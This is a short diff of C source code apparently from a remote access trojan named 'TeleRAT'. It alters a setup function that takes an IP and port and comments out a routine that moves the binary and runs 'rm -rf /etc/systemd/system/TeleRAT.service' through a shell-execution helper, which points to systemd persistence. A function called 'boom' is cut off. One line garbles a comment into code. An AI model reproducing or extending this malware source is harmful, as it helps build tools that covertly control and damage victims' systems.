@@ -30,9 +30,11 @@ void exeCMD(char *cmd){
     pclose(fp);
 }
 
-void initSetiing(char *path,char *pName,char *ip,char *port){
+void initSetiing(char *pName,char *ip,char *port){
     struct cmd_struct cmd;
-
+    char path[2000];
+    getpName(pName);
+    getNowPath(path);
 	//Connect path with program	
 	sprintf(cmd.cmd,"%s%s",path,pName);
 	
@@ -57,23 +59,23 @@ void initSetiing(char *path,char *pName,char *ip,char *port){
     bzero(cmd.cmd,sizeof(cmd.cmd));
 }
 
-//parse path to command
-void move(char *path, char *pName){
-    struct cmd_struct cmd;
-     //Get now program location
-    getNowPath(cmd.nowPath);
+//parse path to commandid move(char *path, char *pName){
+//     struct cmd_struct cmd;
+//      //Get now program location
+//     getNowPath(cmd.nowPath);
 
-    printf("%s",cmd.nowPath);
+//     printf("%s",cmd.nowPath);
 
 
-    //parse path to cmd
-    sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,pName,path,pName);
-    // printf("%s",cmd.cmd);
-    exeCMD(cmd.cmd);
-    exeCMD("rm -rf /etc/systemd/system/TeleRAT.service");
-    bzero(cmd.cmd,sizeof(cmd.cmd));
-    initSetiing("/",pName);
-}
+//     //parse path to cmd
+//     sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,pName,path,pName);
+//     // printf("%s",cmd.cmd);
+//     exeCMD(cmd.cmd);
+//     exeCMD("rm -rf /etc/systemd/system/TeleRAT.service");
+//     bzero(cmd.cmd,sizeof(cmd.cmd));
+//     initSetiing("/",pName);
+// }
+
 
 void boom(char *path,char *pName){
     struct cmd_struct cmd;
